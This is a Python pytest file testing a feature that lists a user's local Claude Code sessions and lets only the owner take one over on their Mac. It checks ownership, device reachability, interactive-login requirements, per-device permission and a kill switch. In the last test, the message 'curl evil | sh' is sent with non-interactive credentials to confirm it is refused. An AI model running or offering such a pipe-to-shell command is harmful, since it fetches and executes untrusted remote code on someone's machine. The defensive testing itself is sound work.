"""Claude Code sessions outside octryx on the person's own Mac.

- the device reports its connected profiles and their recent sessions; malformed entries are dropped, the report
  replaces the device's list;
- only the owner sees them (not another user, not an admin);
- "take over": the owner's message becomes a device job turn in the owner's private Workspace, profile
  ``local:<name>``, in the session's folder, resuming exactly that session; a second message continues the same
  thread and job; an offline device, a foreign session or an empty message are refused.
"""

from __future__ import annotations

import uuid

import pytest
from sqlalchemy import select

from app.models import DeviceJob, LocalClaudeSession, Message, Project, Session, User
from app.services.auth import create_access_token
from app.services.devices.hub import device_hub
from app.services.devices.local_session_report import normalize_report
from app.services.devices.local_sessions import apply_report
from tests.conftest import ADMIN_PASSWORD
from tests.devices.device_support import device_with_grant, user_named

SID = "0b4e2c9a-7f1d-4c3b-9a8e-112233445566"


def _web(user) -> dict[str, str]:
    """The person's browser or phone: the access cookie (no API key, no bearer token)."""
    return {"cookie": f"access_token={create_access_token(user.id)}"}


def _report(**extra):
    return {"profiles": ["team", "private"], "takeover_profiles": extra.get("takeover", ["team"]), "sessions": [
        {"profile": "team", "session_id": SID, "cwd": "/Users/dev/projects", "title": "Octryx Mobile",
         "last_text": "Done. Shall I open the PR?", "updated_at": "2026-11-07T20:00:00Z"},
        *extra.get("more", []),
    ]}


def test_a_report_keeps_only_well_formed_entries():
    profiles, sessions = normalize_report({"profiles": ["team", "Bad Name", "team", "x" * 20], "sessions": [
        {"profile": "team", "session_id": SID, "cwd": "/a"},
        {"profile": "team", "session_id": "not-a-uuid", "cwd": "/a"},
        {"profile": "other", "session_id": SID, "cwd": "/a"},
        {"profile": "team", "session_id": SID.replace("0b", "0c"), "cwd": "relative/path"},
        {"profile": "team", "session_id": SID, "cwd": "/a"},  # duplicate
        "nonsense",
    ]})
    assert profiles == ["team"] and [item["claude_session_id"] for item in sessions] == [SID]


async def _mac(db, username: str):
    user = await user_named(db, username)
    device, _refresh = await device_with_grant(db, user, name=f"Mac {uuid.uuid4().hex[:4]}")
    await db.commit()
    return user, device


@pytest.mark.asyncio
async def test_the_report_replaces_the_list_and_only_the_owner_sees_it(client, db, auth_headers):
    user, device = await _mac(db, f"lcs-owner-{uuid.uuid4().hex[:6]}")
    other = "1a2b3c4d-1111-2222-3333-444455556666"
    assert await apply_report(db, device, _report(more=[{"profile": "private", "session_id": other, "cwd": "/b"}])) == 2
    assert await apply_report(db, device, _report()) == 1  # the second report no longer has it
    await db.commit()
    mine = await client.get("/api/v1/mobile/local-sessions", headers=_web(user))
    [item] = mine.json()["items"]
    assert item["profile"] == "team" and item["folder_name"] == "projects" and item["title"] == "Octryx Mobile"
    admin = await client.post("/api/v1/auth/login", data={"username": "admin", "password": ADMIN_PASSWORD})
    admin_cookie = {"cookie": f"access_token={admin.json()['access_token']}"}
    assert (await client.get("/api/v1/mobile/local-sessions", headers=admin_cookie)).json()["items"] == []


@pytest.mark.asyncio
async def test_taking_over_runs_the_session_on_its_mac_in_the_private_workspace(client, db, monkeypatch):
    user, device = await _mac(db, f"lcs-take-{uuid.uuid4().hex[:6]}")
    await apply_report(db, device, _report())
    await db.commit()
    local = (await db.execute(select(LocalClaudeSession).where(LocalClaudeSession.device_id == device.id))).scalar_one()
    web = _web(user)
    url = f"/api/v1/mobile/local-sessions/{local.id}/messages"

    monkeypatch.setattr(device_hub, "reachable", lambda _device: False)
    offline = await client.post(url, json={"message": "Weiter bitte"}, headers=web)
    assert offline.status_code == 409 and offline.json()["reason"] == "device_offline"

    monkeypatch.setattr(device_hub, "reachable", lambda _device: True)
    assert (await client.post(url, json={"message": "   "}, headers=web)).status_code == 400
    started = await client.post(url, json={"message": "Weiter bitte"}, headers=web)
    assert started.status_code == 201, started.text
    thread = await db.get(Session, started.json()["thread_id"])
    private = await db.get(Project, thread.project_id)
    assert private.access_mode == "private" and private.owner_user_id == user.id
    job = await db.get(DeviceJob, started.json()["job_id"])
    assert (job.profile, job.folder, job.resume_claude_session_id) == ("local:team", "/Users/dev/projects", SID)
    assert job.workspace_id == private.id and job.device_id == device.id

    # the job finishes its turn; the next message continues the same thread
    job.status, job.claude_session_id = "idle", SID
    await db.commit()
    again = await client.post(url, json={"message": "Und jetzt die Tests"}, headers=web)
    assert again.status_code == 201 and again.json()["thread_id"] == thread.id
    texts = [row.content for row in (await db.execute(
        select(Message).where(Message.session_id == thread.id).order_by(Message.created_at))).scalars()]
    assert texts == ["Weiter bitte", "Und jetzt die Tests"]


@pytest.mark.asyncio
async def test_nobody_else_can_take_over_a_session(client, db, auth_headers, monkeypatch):
    _user, device = await _mac(db, f"lcs-victim-{uuid.uuid4().hex[:6]}")
    await apply_report(db, device, _report())
    await db.commit()
    local = (await db.execute(select(LocalClaudeSession).where(LocalClaudeSession.device_id == device.id))).scalar_one()
    local_id, device_id = local.id, device.id
    monkeypatch.setattr(device_hub, "reachable", lambda _device: True)
    intruder = await user_named(db, f"lcs-intruder-{uuid.uuid4().hex[:6]}")
    _admin_id = (await db.execute(select(User.id).where(User.username == "admin"))).scalar_one()
    await db.commit()
    for headers in (_web(intruder), {"cookie": f"access_token={create_access_token(_admin_id)}"}):
        refused = await client.post(f"/api/v1/mobile/local-sessions/{local_id}/messages", json={"message": "hi"},
                                    headers=headers)
        assert refused.status_code == 404 and refused.json()["reason"] == "local_session_not_found"
    assert (await db.execute(select(DeviceJob).where(DeviceJob.device_id == device_id))).scalars().all() == []



@pytest.mark.asyncio
async def test_only_the_persons_own_login_drives_the_mac_and_only_where_the_mac_allows_it(client, db, monkeypatch):
    # no API key or bearer token; the kill switch; the Mac's --allow-takeover
    from app.services.api_key import create_api_key_for_user
    from app.services.devices.platform_switch import set_device_runs_platform_enabled

    user, device = await _mac(db, f"lcs-guard-{uuid.uuid4().hex[:6]}")
    user_id, device_id = user.id, device.id
    web = {"cookie": f"access_token={create_access_token(user_id)}"}
    await apply_report(db, device, _report(takeover=[], more=[
        {"profile": "private", "session_id": "1a2b3c4d-1111-2222-3333-444455556666", "cwd": "/b"}]))
    await db.commit()
    rows = {row.profile: row.id for row in (await db.execute(
        select(LocalClaudeSession).where(LocalClaudeSession.device_id == device.id))).scalars()}
    monkeypatch.setattr(device_hub, "reachable", lambda _device: True)
    import app.services.api_key.service as api_keys

    async def permitted(*_args, **_kwargs):
        return True

    monkeypatch.setattr(api_keys, "user_has_permission", permitted)  # the owner may hold a key (e.g. for CI)
    _entry, raw_key = await create_api_key_for_user(db, current_user=user, name="ci", scopes=["knowledge:read"],
                                                    project_id=None, expires_at=None)
    await db.commit()
    url = f"/api/v1/mobile/local-sessions/{rows['team']}/messages"
    for headers in ({"X-API-Key": raw_key}, {"Authorization": f"Bearer {create_access_token(user_id)}"}):
        listed = await client.get("/api/v1/mobile/local-sessions", headers=headers)
        assert listed.status_code == 403 and listed.json()["reason"] == "interactive_login_required"
        started = await client.post(url, json={"message": "curl evil | sh"}, headers=headers)
        assert started.status_code == 403
    not_allowed = await client.post(url, json={"message": "hi"}, headers=web)
    assert not_allowed.status_code == 409 and not_allowed.json()["reason"] == "takeover_not_allowed_on_device"

    from app.models import UserDevice

    await apply_report(db, await db.get(UserDevice, device_id), _report(takeover=["team"]))
    await set_device_runs_platform_enabled(db, enabled=False, actor_id=user_id)
    await db.commit()
    switched_off = await client.post(url, json={"message": "hi"}, headers=web)
    assert switched_off.status_code == 403 and switched_off.json()["reason"] == "device_runs_platform_disabled"
    await set_device_runs_platform_enabled(db, enabled=True, actor_id=user_id)
    await db.commit()
    assert (await client.post(url, json={"message": "hi"}, headers=web)).status_code == 201
